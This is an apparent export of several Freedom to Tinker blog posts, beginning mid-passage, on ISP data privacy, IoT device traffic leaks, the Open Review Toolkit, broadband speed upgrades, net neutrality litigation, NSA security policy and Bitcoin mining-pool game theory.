takes steps to mitigate privacy risks; (5) would be enhanced by access to the ISP data. In delineating this type of research, our goal was to explicitly “carve out” researchers at universities and research labs without opening a loophole for third-party advertisers. Of course, the exception notwithstanding, researchers also should be mindful of user privacy when conducting research. Just because a researcher is “allowed” to receive a particular data trace from an ISP does not mean that such data should be shared. For example, much network and security research is possible with de-identified network traffic data (e.g., data with anonymized IP addresses), or without packet “payloads” (i.e., the kind of traffic data collected with Deep Packet Inspection). Researchers and ISPs should always take care to apply data minimization techniques that limit the disclosure of private information to only the granularity that is necessary to perform the research. Various practices for minimization exist, such as hashing or removing IP addresses, aggregating statistics over longer time windows, and so forth. The network and security research communities should continue developing norms and standard practices for deciding when, how, and to what degree private data from ISPs can be minimized when it is shared. The FCC, ISPs, customers, and researchers should all care about the security, operation, and performance of the Internet. Achieving these goals often involves sharing customer data with third-parties, such as the network and security research community. As a member of the research community, I am looking forward to reading the text of the rule, which, if our comments are incorporated, will help preserve both customer privacy and the research that keeps the Internet secure and performing well."
"206","2016-03-04","2023-03-24","https://freedom-to-tinker.com/2016/03/04/what-your-isp-probably-knows-about-you/","Earlier this week, I came across a working paper from Professor Peter Swire—a highly respected attorney, professor, and policy expert. Swire’s paper, entitled “Online Privacy and ISPs“, argues that ISPs have limited capability to monitor users’ online activity. The paper argues that ISPs have limited visibility into users’ online activity for three reasons: (1) users are increasingly using many devices and connections, so any single ISP is the conduit of only a fraction of a typical user’s activity; (2) end-to-end encryption is becoming more pervasive, which limits ISPs’ ability to glean information about user activity; and (3) users are increasingly shifting to VPNs to send traffic. An informed reader might surmise that this writeup relates to the reclassification of Internet service providers under Title II of the Telecommunications Act, which gives the FCC a mandate to protect private information that ISPs learn about their customers. This private information includes both personal information, as well as information about a customer’s use of the service that is provided as a result of receiving service—sometimes called Customer Proprietary Network Information, or CPNI. One possible conclusion a reader might draw from this white paper is that ISPs have limited capability to learn information about customers’ use of their service and hence should not be subject to additional privacy regulations. I am not taking a position in this policy debate, nor do I intend to make any normative statements about whether an ISP’s ability to see this type of user information is inherently “good” or “bad” (in fact, one might even argue that an ISP’s ability to see this information might improve network security, network management, or other services). Nevertheless, these debates should be based on a technical picture that is as accurate as possible. In this vein, it is worth examining Professor Swire’s “factual description of today’s online ecosystem” that claims to offer the reader an “up-to-date and accurate understanding of the facts”. It is true that the report certainly contains many facts, but it also omits important details about the “online ecosystem”. Below, I fill in what I see as some important missing pieces. Much of what I discuss below I have also sent verbatim in a letter to the FCC Chairman. I hope that the original report will ultimately incorporate some of these points. [Update (March 9): Swire notes in a response that the report itself doesn’t contain technical inaccuracies. Although there are certainly many points that are arguable, they are hard to disprove without better data, so it is difficult to “prove” the inaccuracies. Even if we take it as a given that there are no inaccuracies, that’s a very different thing than saying that the report tells the whole story.] Claim 1: User Mobility Prevents a Single ISP from Observing a Significant Fraction of User Traffic The report’s claim: Due to increased mobility, users are increasingly using many devices and connections, so any single ISP is the conduit of only a fraction of a typical user’s activity. A missing piece: A single ISP can still track significant user activities from home network traffic and (as the user moves) through WiFi sharing services. The report cites statistics from Cisco on the increase in mobile devices; these statistics do not offer precise information about how user traffic distributes across ISPs, but it’s reasonable to assume that users who are more mobile are not sending all of their traffic over a single access ISP. Yet, a user’s increased mobility by no means implies that a single ISP cannot track users’ activities in their homes. Our previous research has shown that the traffic that users send in their home networks—typically through a single ISP—reveals significant information about user activity and behavior. The median home had about five connected devices at any give time. Simply by observing traffic patterns (i.e., without looking at any packet contents), we could determine the types of devices that users had in their homes, as well as how often (and how heavily) they used each device. In some cases, we could even determine when the user was likely to be home, based on diurnal traffic usage patterns. We could determine the most popular domains that each home visited. The figure below shows examples of such popular domains. Lots to learn from home network traffic. This example from our previous work shows an example of what an ISP can learn from network traffic popular domains from 25 home networks. The number of homes for which each domain appeared in the top 5 or top 10 most popular domains for that home. Based on what we can observe from this traffic, it should come as no surprise that the data that we gathered—which is the same data an ISP can see—warrants special handling, due to its private nature. University Institutional Review Boards (IRBs) consider this type of work human subjects research because it “obtains (1) data through intervention or interaction with the individual; or (2) private, identifiable information”; indeed, we had to get special approval to even perform this study in the first place. The report claims that user mobility may make it more difficult for a single ISP to track a user’s activity because a mobile user is more likely to connect through different ISPs. But, another twist in this story makes me think that this deserves more careful examination: the rise of shared WiFi hotspots—such as Xfinity WiFi, which had deployed 10 million WiFi hotspots as of mid-2015, and which users had accessed 3.6 billion times—in some cases allow a single ISP to track mobile users more than they otherwise would be able to without such a service. Incidentally, the report also says that “limited processing power and storage placed technical and cost limits [deep-packet inspection] capability”, but in the last mile, data-rates are substantially lower and can thus permit DPI. For example, we had no trouble gathering all of the traffic data for our research on a simple, low-cost Netgear router running OpenWrt. : Most home networks we have studied are sending traffic at only tens of megabits per second, even at peak rate. We have been able to perform packet capture on very resource-limited devices at these rates. Claim 2: End-to-End Encryption Limits ISP Visibility into User Behavior The report’s claim: End-to-end encryption on websites is increasingly pervasive; thus, ISPs have limited visibility into user behavior . A missing piece: ISPs can observe user activity based on general traffic patterns (e.g., volumes), unencrypted portions of communication, and the large number of in-home devices that do not encrypt traffic. Nearly all Internet-connected devices use the Domain Name System (DNS) to look up domain names for specific Internet destinations. These DNS lookups are generally “in the clear” (i.e., unencrypted) and can be particularly revealing. For example, we conducted a recent study of traffic patterns from a collection of IoT devices; in that study, we observed, for example, that a Nest thermostat routinely performs a DNS lookup to frontdoor.nest.com, a popular digital photo frame routinely issued DNS queries to api.pix-star.com, and a popular IP camera routinely issued DNS queries to (somewhat ironically!) sharxsecurity.com. No sophisticated traffic analysis was required to identify the usage of these devices from plaintext DNS query traffic. Even when a site uses HTTPS to communicate with an Internet destination, the initial TLS handshake typically indicates the hostname that it is communicating with using the Server Name Indication (SNI), which allows the server to present the client with the appropriate certificate for the corresponding domain that the client is attempting to communicate with. The SNI is transmitted in cleartext and naturally reveals information about the domains that a user’s devices are communicating with. The report cites the deployment of HTTPS on many major websites as evidence that traffic from consumers is increasingly encrypted end-to-end. Yet, consumer networks are increasingly being equipped with Internet of Things (IoT) devices, many of which we have observed send traffic entirely in cleartext. In fact, of the devices we have studied, cleartext communication was the norm, not the exception. While of course, we all hope that many of these devices ultimately shift to using encrypted communications in the future, the current state of affairs is much different. Even in the longer term, it is possible that certain IoT devices may be so resource-limited as to make cryptography impractical, particularly in the case of low-cost IoT devices. The deployment of HTTPS on major websites is certainly encouraging for the state of privacy on the Internet in general, but it is a poor indicator for how much traffic from a home network is encrypted. Claim 3: Users are Increasingly Using VPNs, Which Conceal User Activity from ISPs The report’s claim: Users’ increasing use of VPNs encrypt all traffic, including DNS, as traffic traverses the ISP; therefore, ISPs cannot see any user traffic. A missing piece: DNS traffic sometimes goes to the ISP’s DNS server after it exits the VPN tunnel. Configuring certain devices to use VPNs may not be straightforward for many users. Whether VPNs will prevent ISPs from seeing DNS traffic depends on the configuration of the VPN tunnel. A VPN is simply an encrypted tunnel that takes the original IP packet and encapsulates the packet in a new packet whose destination IP address is the tunnel endpoint. But, the IP address for DNS resolution is typically set by the Dynamic Host Configuration Protocol (DHCP). If the consumer uses the ISP’s DHCP server to configure the host in question (which most of us do), the client’s DNS server will still be the ISP’s DNS server, unless the client’s VPN software explicitly reconfigures the DNS server (many VPN clients do not). In these cases, the ISP will still continue to observe all of the user’s DNS traffic, even if the user configures a VPN tunnel: the DNS queries will exit the VPN tunnel and head right back to the ISP’s DNS server. It is often for a user to configure a device to not use the ISP’s DNS server, but this is by no means automatic and in certain cases (e.g., on IoT devices) it may be quite difficult. Even in cases where a VPN uses its own DNS resolver, the traffic for those queries by no means stay local: DNS cache misses can cause these queries to traverse many ISPs. Traffic from VPNs doesn’t simply disappear: it merely resurfaces in another ISP that can subsequently monitor user activity. The opportunities for observing user traffic are substantial. For example, in a recent simple experiment that postdoc Philipp Winter performed, web requests from Tor exit relays to the Alexa top 1,000 websites traversed more than 350 Internet service providers considering the DNS lookups from these exit relays, the traffic from these exit nodes traverses an additional 173 Internet service providers. Furthermore, VPN clients are typically for desktop machines and, in some cases, mobile devices such as phones and tablets. As previously discussed, IoT devices in homes will continue to generate more traffic. Most such devices do not support VPN software. While it is conceivable that a user could set up an encrypted VPN tunnel from the home router and route all home traffic through a VPN, typical home gateways don’t easily support this functionality at this point, and configuring such a setup would be cumbersome for the typical user. Conclusion Policymakers, industry, and consumers should debate whether, when, and how the FCC should impose privacy protections for consumers. Robust debate, however, needs an understanding of the technical underpinnings that is complete as possible. In this post, I have attempted to fill in what struck me as some missing pieces in Professor Swire’s discussion of ISPs’ ability to observe user activity in network traffic. The report implies that ISPs’ access to information about users’ online activity is neither “comprehensive” nor “unique”. Yet, an ISP is in the position to see user traffic to much more user traffic from many more devices than other parties in the Internet ecosystem—and certainly much more than the paper would have the reader conclude. I hope that the original working paper is revised to reflect a more complete and balanced view of ISPs’ capabilities."
"207","2016-01-19","2023-03-24","https://freedom-to-tinker.com/2016/01/19/who-will-secure-the-internet-of-things/","Over the past several months, CITP-affiliated Ph.D. student Sarthak Grover and fellow Roya Ensafi been investigating various security and privacy vulnerabilities of Internet of Things (IoT) devices in the home network, to get a better sense of the current state of smart devices that many consumers have begun to install in their homes. To explore this question, we purchased a collection of popular IoT devices, connected them to a laboratory network at CITP, and monitored the traffic that these devices exchanged with the public Internet. We initially expected that end-to-end encryption might foil our attempts to monitor the traffic to and from these devices. The devices we explored included a Belkin WeMo Switch, the Nest Thermostat, an Ubi Smart Speaker, a Sharx Security Camera, a PixStar Digital Photoframe, and a Smartthings hub. What We Found: Be Afraid! Many devices fail to encrypt at least some of the traffic that they send and receive. Investigating the traffic to and from these devices turned out to be much easier than expected, as many of the devices exchanged personal or private information with servers on the Internet in the clear, completely unencrypted. We recently presented a summary of our findings to the Federal Trade Commission, last week at PrivacyCon. The video of Sarthak’s talk is available from the FTC website, as well as on YouTube. Among some of the more striking findings include: The Nest thermostat was revealing location information of the home and weather station, including the user’s zip code, in the clear. (Note: Nest promptly fixed this bug after we notified them.) The Ubi uses unencrypted HTTP to communicate information to its portal, including voice chats, sensor readings (sound, temperature, light, humidity). It also communicates to the user using unencrypted email. Needless to say, much of this information, including the sensor readings, could reveal critical information, such as whether the user was home, or even movements within a house. The Sharx security camera transmits video over unencrypted FTP; if the server for the video archive is outside of the home, this traffic could also be intercepted by an eavesdropper. All traffic to and from the PixStar photoframe was sent unencrypted, revealing many user interactions with the device. Traffic capture from Nest Thermostat in Fall 2015, showing user zip code and other information in cleartext. Traffic capture from Ubi, which sends sensor values and states in clear text. Some devices encrypt data traffic, but encryption may not be enough. A natural reaction to some of these findings might be that these devices should encrypt all traffic that they send and receive. Indeed, some devices we investigated (e.g., the Smartthings hub) already do so. Encryption may be a good starting point, but by itself, it appears to be insufficient for preserving user privacy. For example, user interactions with these devices generate traffic signatures that reveal information, such as when power to an outlet has been switched on or off. It appears that simple traffic features such as traffic volume over time may be sufficient to reveal certain user activities. In all cases, DNS queries from the devices clearly indicate the presence of these devices in a user’s home. Indeed, even when the data traffic itself is encrypted, other traffic sent in the clear, such as DNS lookups, may reveal not only the presence of certain devices in your home, but likely also information about both usage and activity patterns. Of course, there is also the concern about how these companies may use and share the data that they collect, even if they manage to collect it securely. And, beyond the obvious and more conventional privacy and security risks, there are also potential physical risks to infrastructure that may result from these privacy and security problems. Old problems, new constraints. Many of the security and privacy problems that we see with IoT devices sound familiar, but these problems arise in a new, unique context, which present unique challenges: Fundamentally insecure. Manufacturers of consumer products have little interest in releasing software patches and may even design the device without any interfaces for patching the software in the first place. There are various examples of insecure devices that ordinary users may connect to the network without any attempts to secure them (or any means of doing so). Occasionally, these insecure devices can result in “stepping stones” into the home for attackers to mount more extensive attacks. A recent study identified more than 500,000 insecure, publicly accessible embedded networked devices. Diverse. Consumer IoT settings bring a diversity of devices, manufacturers, firmware versions, and so forth. This diversity can make it difficult for a consumer (or the consumer’s ISP) to answer even simple questions such as exhaustively identifying the set of devices that are connected to the network in the first place, let alone detecting behavior or network traffic that might reveal an anomaly, compromise, or attack. Constrained. Many of the devices in an IoT network are severely resource-constrained: the devices may have limited processing or storage capabilities, or even limited battery life, and they often lack a screen or intuitive user interface. In some cases, a user may not even be able to log into the device. Complicating matters, a user has limited control over the IoT device, particularly as compared to a general-purpose computing platform. When we connect a general purpose device to a network, we typically have at least a modicum of choice and control about what software we run (e.g., browser, operating system), and perhaps some more visibility or control into how that device interacts with other devices on the network and on the public Internet. When we connect a camera, thermostat, or sensor to our network, the hardware and software are much more tightly integrated, and our visibility into and control over that device is much more limited. At this point, we have trouble, for example, even knowing that a device might be sending private data to the Internet, let alone being able to stop it. Compounding all of these problems, of course, is the access a consumer gives an untrusted IoT device to other data or devices on the home network, simply by connecting it to the network—effectively placing it behind the firewall and giving it full network access, including in many cases the shared key for the Wi-Fi network. A Way Forward Ultimately, multiple stakeholders may be involved with ensuring the security of a networked IoT device, including consumers, manufacturers, and Internet service providers. There remain many unanswered questions concerning both who is able to (and responsible for) securing these devices, but we should start the discussion about how to improve the security for networks with IoT devices. This discussion will include both policy aspects (including who bears the ultimate responsibility for device insecurity, whether devices need to adopt standard practices or behavior, and for how long their manufacturers should continue to support them), as well as technical aspects (including how we design the network to better monitor and control the behavior of these often-insecure devices). Devices should be more transparent. The first step towards improving security and privacy for IoT should be to work with manufacturers to improve the transparency of these IoT devices, so that consumers (and possibly ISPs) have more visibility into what software the devices are running, and what traffic they are sending and receiving. This, of course, is a Herculean effort, given the vast quantity and diversity of device manufacturers; an alternative would be trying to infer what devices are connected to the network based on their traffic behavior, but doing so in a way that is both comprehensive, accurate, and reasonably informative seems extremely difficult. Instead, some IoT device manufacturers might standardize on a manifest protocol that announces basic information, such as the device type, available sensors, firmware version, the set of destinations the device expects to communicate with (and whether the traffic is encrypted), and so forth. (Of course, such a manifest poses its own security risks.) Network infrastructure can play a role. Given such basic information, anomalous behavior that is suggestive of a compromise or data leak would be more evident to network intrusion detection systems and firewalls—in other words, we could bring more of our standard network security tools to bear on these devices, once we have a way to identify what the devices are and what their expected behavior should be. Such a manifest might also serve as a concise (and machine readable!) privacy statement; a concise manifest might be one way for consumers to evaluate their comfort with a certain device, even though it may be far from a complete privacy statement. Armed with such basic information about the devices on the network, smart network switches would have a much easier way to implement network security policies. For example, a user could specify that the smart camera should never be able to communicate with the public Internet, or that the thermostat should only be able to interact with the window locks if someone is present. Current network switches don’t provide easy mechanisms for consumers to either express or implement these types of policies. Advances in Software-Defined Networking (SDN) in software switches such as Open vSwitch may make it possible to implement policies that resolve contention for shared resources and conflicts, or to isolate devices on the network from one another, but even if that is a reasonable engineering direction, this technology will only take us part of the way, as users will ultimately need far better interfaces to both monitor network activity and express policies about how these devices should behave and exchange traffic. Update [20 Jan 2015]: After significant press coverage, Nest has contacted the media to clarify that the information being leaked in cleartext was not the zip code of the thermostat, but merely the zip code that the user enters when configuring the device. (Clarifying statement here.) Of course, when would a user ever enter a zip code other than that of their home, where the thermostat was located?"
"208","2016-11-27","2023-03-24","https://freedom-to-tinker.com/2016/11/27/announcing-the-open-review-toolkit/","I’m happy to announce the release of the Open Review Toolkit, open source software that enables you to convert your book manuscript into a website that can be used for Open Review. During the Open Review process everyone can read and annotate your manuscript, and you can collect valuable data to help launch your book. The goals of the Open Review process are better books, higher sales, and increased access to knowledge. In an earlier post, I described some of the helpful feedback that I’ve received during the Open Review of my book Bit by Bit: Social Research in the Digital Age. Now, in this post I’ll describe more about the Open Review Toolkit—which has been generously supported by a grant from the Alfred P. Sloan Foundation—and how you can use it for your book. As described on the project’s website, the Open Review Toolkit is a set of open source scripts that you can download and use to convert your manuscript to an Open Review website. One way to think about it is that the Open Review Toolkit is the plumbing that ties together four outstanding projects: Hypothes.is, Pandoc, Google Analytics, and Google Forms. Full technical details and all the code are available from the Open Review Toolkit GitHub repository, but here’s an overview. The build process that converts a manuscript into an Open Review website is codified in a single Makefile and has three primary steps: Pandoc converts the book manuscript into a single HTML file. A set of custom scripts enrich the single HTML (e.g., with richer information about each citation) and then split the single HTML file into a bunch of different HTML files, one for each section of the book. Middleman uses those HTML files and some custom templates to create the Open Review website, which is a static HTML website. Step 1 Pandoc converts the book manuscript into a single HTML file. Currently, the only supported input format for this first step is Markdown. In other words, at this time, your manuscript must be written in Markdown. However, Pandoc supports a variety of formats as inputs, and in the future we hope to add support for additional input formats, such as LaTeX and Word. If you’d like to help build support for additional input formats, please get in touch. Step 2 The custom scripts enrich and split the HTML output from Pandoc. First, an enrichment script adds information to each citation. In the future, additional enrichments could also be added at this step. Next, the splitting script splits the single HTML file into one file for each section of the book. These sections are then placed in directory structure that reflects to hierarchy of the sections in the manuscript. This splitting script also creates a JSON file that includes metadata about the manuscript structure. This JSON metadata file that allows the Middleman build process to create things such as the table of contents and previous / next page links between sections. Step 3 Middleman builds the Open Review website, which is a static HTML website. The Middleman project lives inside the website/ directory. This project is pre-populated with existing layouts that include Google Analytics, Hypothes.is, and navigational elements for the site. This is also where pages that are part of the Open Review website but are not part of the manuscript reside (e.g., an About page). The HTML files from step 2 are used as the primary content for each book page on the site. These HTML files should not be manually modified as they will be overwritten the next time the site is built. This entire build process takes place inside of a virtual machine we created that comes pre-installed with all the open-source software that you will need. By using this virtual machine, we hope to ensure that the Open Review Toolkit will work right the first time no matter what operating system you are using. Once those three steps are complete, you have a set of static html files that you can host anywhere that you want (for my book, we are using GitHub pages). On the Open Review Toolkit website, I also describe additional features of the Open Review websites. We’ve tried to make it as easy as possible to convert your manuscript into a modern and functional Open Review website. All of our code is open source, but if you’d like to hire a developer to help you do the conversion, the Open Review Toolkit has a recommend list of Preferred Partners. The Open Review Toolkit, which was inspired by earlier innovations in academic publishing, would not have been possible without the help of many people. I would like to thank the folks at the the Agathon Group, particularly Luke Baker (coding) and Paul Yuen (design) who built the Open Review website for my book Bit by Bit: Social Research in the Digital Age. The Open Review Toolkit grew out of that initial code and design. I would also like to thank Meagan Levinson and Princeton University Press for their support during the first Open Review process. Further, I would like to thank the Alfred P. Sloan Foundation for their support of the Open Review Toolkit. Finally, the Open Review Toolkit builds on some amazing open source software. I’d like to thank everyone who contributed to the project we used in the Open Review Toolkit: Pandoc, LaTeX, hypothes.is, Vagrant, Ansible, Middleman, Bootstrap, Nokogiri, GNU Make, and Bundler. You can read more about the Open Review Toolkit at our webpage and download our code from GitHub."
"209","2015-12-29","2023-03-24","https://freedom-to-tinker.com/2015/12/29/how-will-consumers-use-faster-internet-speeds/","This week saw an exciting announcement about the experimental deployment of DOCSIS 3.1 in limited markets in the United States, including Philadelphia, Atlanta, and parts of northern California, which will bring gigabit-per-second Internet speeds to many homes over the existing cable infrastructure. The potential for gigabit speeds over the existing cable networks bring hope that more consumers will ultimately enjoy much higher-speed Internet connectivity both in the United States and elsewhere. This development is also a pointed response to the not-so-implicit pressure from the Federal Communications Commission to deploy higher-speed Internet connectivity, which includes other developments such as the redefinition of broadband to a downstream throughput rate of 25 megabits per second, up from a previous (and somewhat laughable) definition of 4 Mbps; many commissioners have also stated their intentions to raise the threshold for the definition of a broadband network to a downstream throughput of 100 Mbps, as a further indication that ISPs will see increasing pressure for higher speed links to home networks. Yet, the National Cable and Telecommunications Association has also claimed in an FCC filing that such speeds are far more than a “typical” broadband user would require. These developments and posturing beg the question: How will consumers change their behavior in response to faster downstream throughput from their Internet service providers? Ph.D. student Sarthak Grover, postdoc Roya Ensafi, and I set out to study this question with a cohort of about 6,000 Comcast subscribers in Salt Lake City, Utah, from October through December 2014. The study involved what is called a randomized controlled trial, an experimental method commonly used in scientific experiments where a group of users is randomly divided into a control group (whose user experience no change in conditions) and a treatment group (whose users are subject to a change in conditions). Assuming the cohort is large enough and represents a cross-section of the demographic of interest, and that the users for the treatment group are selected at random, it is possible to observe differences between the two groups’ outcomes and conclude how the treatment affects the outcome. In the case of this specific study, the control group consisted of about 5,000 Comcast subscribers who were paying for (and receiving) 105 Mbps downstream throughput; the treatment group, on the other hand, comprised about 1,500 Comcast subscribers who were paying for 105 Mbps but at the beginning of the study period were silently upgraded to 250 Mbps. In other words, users in the treatment group were receiving faster Internet service but was unaware of the faster downstream throughput of their connections. We explored how this treatment affected user behavior and made a few surprising discoveries: “Moderate” users tend to adjust their behavior more than the “heavy” users. We expected that subscribers who downloaded the most data in the 250 Mbps service tier would be the ones causing the largest difference in mean demand between the two groups of users (previous studies have observed this phenomenon, and we do observe this behavior for the most aggressive users). To our surprise, however, the median subscribers in the two groups exhibited much more significant differences in traffic demand, particularly at peak times. Notably, the 40% of subscribers with lowest peak demands more than double their daily peak traffic demand in response to service-tier upgrades (i.e., in the treatment group). With the exception of the most aggressive peak-time subscribers, the subscribers who are below the 40th percentile in terms of peak demands increase their peak demand more than users who initially had higher peak demands. This result suggests a surprising trend: it’s not the aggressive data hogs who account for most of the increased use in response to faster speeds, but rather the “typical” Internet user, who tends to use the Internet more as a result of the faster speeds. Our dataset does not contain application information, so it is difficult to say what, exactly is responsible for the higher data usage of the median user. Yet, the result uncovers an oft-forgotten phenomena of faster links: even existing applications that do not need to “max out” the link capacity (e.g., Web browsing, and even most video streaming) can benefit from a higher capacity link, simply because they will see better performance overall (e.g., faster load times and more resilience to packet loss, particularly when multiple parallel connections are in use). It might just be that the typical user is using the Internet more with the faster connection simply because the experience is better, not because they’re interested in filling the link to capacity (at least not yet!). Users may use faster speeds for shorter periods of time, not always during “prime time”. There has been much ado about prime-time video streaming usage, and we most certainly see those effects in our data. To our surprise, the average usage per subscriber during prime-time hours was roughly the same between the treatment and control groups, yet outside of prime time, the difference in usage was much more pronounced between the two groups, with average usage per subscriber in the treatment group exhibiting 25% more usage than that in the control group for non-prime-time weekday hours. We also observe that the peak-to-mean ratios for usage in the treatment group are significantly higher than they are in the control group, indicating that users with faster speeds may periodically (and for short times) take advantage of the significantly higher speeds, even though they are not sustaining a high rate that exhausts the higher capacity. These results are interesting for last-mile Internet service providers because they suggest that the speeds at the edge may not currently be the limiting factor for user traffic demand. Specifically, the changes in peak traffic outside of prime-time hours also suggest that even the (relatively) lower-speed connections (e.g., 105 Mbps) may be sufficient to satisfy the demands of users during prime-time hours. Of course, the constraints on prime-time demand (much of which is largely streaming) likely result from other factors, including both available content and perhaps the well-known phenomena of congestion in the middle of the network, rather than in the last mile. All of this points to the increasing importance of resolving the performance issues that we see as a result of interconnection. In the best case, faster Internet service moves the bottleneck from the last mile to elsewhere in the network (e.g., interconnection points, long-haul transit links); but, in reality, it seems that the bottlenecks are already there, and we should focus on mitigating those points of congestion. Further reading and study. You’ll be able to read more about our study in the following paper: A Case Study of Traffic Demand Response to Broadband Service-Plan Upgrades. S. Grover, R. Ensafi, N. Feamster. Passive and Active Measurement Conference (PAM). Heraklion, Crete, Greece. March 2016. (We will post an update when the final paper is published in early 2016.) There is plenty of room for follow-up work, of course; notably, the data we had access to did not have information about application usage, and only reflected byte-level usage at fifteen-minute intervals. Future studies could (and should) continue to study the effects of higher-speed links by exploring how the usage of specific applications (e.g., streaming video, file sharing, Web browsing) changes in response to higher downstream throughput."
"210","2014-01-14","2023-03-24","https://freedom-to-tinker.com/2014/01/14/is-there-a-future-for-net-neutrality-after-verizon-v-fcc/","In a decision that was widely predicted by those who have been following the case, the Court of Appeals for the D.C. Circuit has invalidated the FCC’s Open Internet Rules (so-called net neutrality regulations), which imposed non-discrimination and anti-blocking requirements on broadband Internet access providers. The rules were challenged by Verizon as soon as they were enacted in 2010. The court held that, given the FCC’s past (and never reversed or modified) regulatory choice to classify broadband providers under the Telecommunications Act of 1996 as “information services” rather than “telecommunications services,” it cannot now impose on them common carrier obligations that apply under the statute only to services classified as telecommunications. Verizon argued in the case that the Open Internet Rules were not common carrier regulations, but the court didn’t buy it. A threshold issue in the case was whether the FCC has authority from Congress to regulate broadband providers at all. The court held that it does, under a provision of the Telecommunications Act that directs the FCC to encourage nationwide broadband deployment. (In prior litigation, the FCC had unsuccessfully argued that it had jurisdiction to regulate under a different provision of the statute.) In its analysis of the jurisdictional question, the court accepted Verizon’s analysis of the broadband market with respect to the likely negative impact of a two-way pricing model (i.e., a model that allows broadband providers to charge both users and edge providers) on broadband deployment. The FCC argued that non-discrimination and non-blocking rules encourage broadband deployment through the operation of a “virtuous cycle” in which low barriers to entry for edge providers (like Google, Netflix, and Amazon) drive the creation of innovative services, which drives consumer demand for better and faster broadband, which drives broadband providers to improve infrastructure, which drives more creation of innovative edge services. Absent those rules, the FCC argued, broadband providers will move to maximize revenue by charging not only users but also edge providers, thus driving up entry costs for developers of innovative web-based applications, flattening consumer demand, and stifling further expansion and improvement of network infrastructure. If the jurisdictional question had been the only issue in the case, the “virtuous cycle” rationale would have been an ace in the hole for the FCC. Unfortunately, however, for the FCC and proponents of a “neutral net,” including myself, the FCC’s past regulatory choices continue to haunt it. Following the court’s decision, which certainly comes as no surprise to lawyers at the FCC, the ball is back in the FCC’s court to do what it proposed to do back in 2010 but has so far not had the political will to do: separate, for regulatory purposes, the connectivity component of broadband, which consists of functions that enable the transmission of data, from the information component, which consists of services such as e-mail, access to online newsgroups, and the ability to create a personal Web page. By reclassifying the connectivity component as a telecommunications service, the FCC would be operating squarely within the bounds of its statutory authority to impose anti-blocking and non-discrimination obligations on broadband providers. The FCC has the authority to modify its previous classification, as long as it gives a good reason for doing so, which it can do, if only it has the will. This is an opportunity for the FCC’s new Chairman, Tom Wheeler, to make good on President Obama’s past promises to support net neutrality."
"211","2015-01-30","2023-03-24","https://freedom-to-tinker.com/2015/01/30/nine-awesome-bitcoin-projects-at-princeton/","As promised, here are the final project presentations from the Bitcoin and cryptocurrency technologies class I taught at Princeton. I encouraged students to build something real, rather than toy class projects, and they delivered. I hope you’ll find these presentations interesting and educational, and that you build on the work presented here (I’ve linked to the projects on GitHub if the code is available). If you haven’t already, you should sign up for the online version of this class we’re teaching starting in a couple of weeks. The class will prepare you to do projects just like these. Note: you’ll have to turn the volume all the way up and/or use headphones. Karthik Dhore, Ben Stallworth, Keji Xu created a physical implementation of smart property (on a Raspberry Pi) that can be controlled and traded via the block chain. Code on GitHub. Dan Kang, Charles Marsh, and Shubhro Saha presented a quantitative analysis of Altcoins based on block chain and price data. Harry Kalodner, Miles Carlsten, and Paul Ellenbogen implemented pay-as-you-go proxy servers using Bitcoin micropayments. Simin Chen, Stephen Cook, Yotam Sagiv, Vibhaa Sivaraman, and Tom Wu built an IDE for the Bitcoin scripting language. Code on GitHub, demo. Saahil Madge implemented a Bitcoin “beacon”. Code on GitHub, demo. Walker Davis built a more secure Bitcoin wallet using threshold cryptography. Charles Guo, Frank Jiang, Akis Kattis, Lucas Mayer, Hansen Qian, and Yotam Sagiv built Arbitrum, and Altcoin that enables smart contracts and efficient arbitration. Shivam Agarwal, Pranav Gokhale, Alex Iriza, and Hannah Park developed programming assignments for teaching Bitcoin and cryptocurrencies. This was an example of bootstrapping that worked out really well — normally I would have used the help of a team of TAs to develop programming assignments, but no such TAs were available for this class because we didn’t yet have students trained in the ins and outs of Bitcoin! So we made it a class project to develop these assignments. We’ll also be using these in the online version of the class this semester. Ethan Gordon and Patrick Yu implemented CoinJoin. Code on GitHub. That’s it for now. See you in two weeks on Piazza!"
"212","2015-02-26","2023-03-24","https://freedom-to-tinker.com/2015/02/26/a-clear-line-between-offense-and-defense/","The New York Times, in an editorial today entitled “Arms Control for a Cyberage“, writes, The problem is that unlike conventional weapons, with cyberweapons “there’s no clear line between offense and defense,” as President Obama noted this month in an interview with Re/code, a technology news publication. Defense in cyberwarfare consists of pre-emptively locating the enemy’s weakness, which means getting into its networks. This is simply wrong. The Editorial Board should not be so quick to accept the statement that “there’s no clear line between offense and defense”, nor the claim that “Defense in cyberwarfare consists of preemptively … getting into the enemy’s networks.” There’s a better kind of defense: working to increase the safety of *all* the software systems we use. But the U.S. Government, and particularly the NSA, has been actively working for years to undermine the safety and security of our computer software, by discouraging the adoption of secure communications by civil society, by attempting to insert backdoors into cryptographic protocols, by weakening security standards. The NSA does this so that they can break into as many systems as they can, ostensibly for national security; but the consequence is that the Iranis, the Chinese, the Russians, and independent for-profit hackers can break into all of our systems as well. By “our systems” I mean civil society: your phone calls, the credit-card numbers you use for online purchases, your e-mail. Improving the security of all these systems *is* separated by a clear line from offensive operations. The defenses I’m describing here would defend all of us, individually and nationally—if only the NSA would stop actively undermining them. Don’t buy the NSA’s line that defense in cyberwarfare must be a kind of offense."
"213","2015-03-31","2023-03-24","https://freedom-to-tinker.com/2015/03/31/bitcoin-and-game-theory-were-still-scratching-the-surface/","In an earlier post I argued why Bitcoin’s stability is fundamentally a game-theoretic proposition, and ended with some questions: Can we effectively model the system with all its interacting components in the language of strategies and payoff-maximization? Is the resulting model tractable — can we analyze it mathematically or using simulations? And most importantly, do its predictions match what we observe in practice? Let’s look at those questions in the context of a “block withholding attack” between mining pools. Recall that mining pools are groups of individual miners who pool their computing power as well as their rewards. Suppose two mining pools — let’s call them blue and red — are both seeking to maximize their mining rewards. Let’s say the manager of the red pool decides to infiltrate the blue pool and decrease their efficiency using some of the mining power that red (directly or indirectly) controls. This can be done by submitting shares (partial proofs of work) to earn a share of rewards, but withholding any valid blocks which are found and therefore not contributing any productive work to the blue pool. At first sight this seems like cutting off your nose to spite your face — sure, blue’s efficiency will be hurt, but red is wasting hash power as well. To get a handle on this situation, let’s write down three rules that govern rewards in pooled mining: A pool’s revenues in any period are proportional to the number of Bitcoin blocks that its members mine, measured as a fraction of the total blocks mined in that period. A miner’s rewards are proportional to the number of “shares” submitted, as a fraction of the total shares submitted by all members of that pool. Miners can easily create numerous pseudo-identities (“sybils”), each contributing a very small amount of mining power. Therefore pools can’t easily detect if a miner is withholding valid blocks (and can’t punish a miner for doing so). These rules are somewhat of an approximation, but they are widely accepted as a starting point due to their analytical clarity. Within this framework, we’d like to determine if a block withholding attack can be profitable. 